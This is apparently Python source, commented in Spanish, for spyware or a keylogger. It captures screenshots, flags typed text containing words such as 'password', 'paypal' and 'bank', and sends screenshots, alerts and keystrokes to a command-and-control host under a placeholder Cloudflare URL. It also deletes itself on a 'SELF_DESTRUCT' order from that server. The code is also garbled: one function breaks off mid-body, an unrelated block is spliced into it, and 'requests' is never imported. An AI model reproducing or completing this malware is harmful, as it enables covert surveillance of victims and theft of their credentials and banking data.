import os, sys
from PIL import ImageGrab
import base64
from io import BytesIO

def take_screenshot():
    # Capturar la pantalla completa
    screenshot = ImageGrab.grab()
    
    # Comprimir la imagen para que viaje rápido
    buffer = BytesIO()
    screenshot.save(buffer, format="JPEG", quality=50)
 # Lista de palabras que nos interesan
keywords = ["password", "login", "admin", "paypal", "bank"]

def check_keywords(text):
    if any(key in text.lower() for key in keywords):
        # Enviar alerta de texto crítico a Telegram
        url = "https://tu-url-cloudflare.com/alert.php"
        requests.post(url, data={'msg': f"⚠️ ACTIVIDAD CRÍTICA en {os.getenv('COMPUTERNAME')}: {text}"})
   
    # Convertir a Base64 para enviarla por HTTP POST
    img_str = base64.b64encode(buffer.getvalue()).decode()
    
    # Enviar al servidor C2
    url = "https://tu-url-cloudflare.com/upload_img.php"
    requests.post(url, data={'host': os.getenv('COMPUTERNAME'), 'img': img_str})

def send_data(keys):
    try:
        url = f"https://tu-url-cloudflare.com/check.php?host={os.getenv('COMPUTERNAME')}"
        response = requests.get(url)
        
        if "SELF_DESTRUCT" in response.text:
            print("Orden recibida. Borrando huellas...")
            # Borrar el archivo actual y salir
            os.remove(sys.argv[0]) 
            sys.exit()
            
        # Si no hay orden de kill, enviar los datos normalmente al confirm.php
        requests.get(f"https://tu-url-cloudflare.com/confirm.php?data={keys}")
    except:
        pass
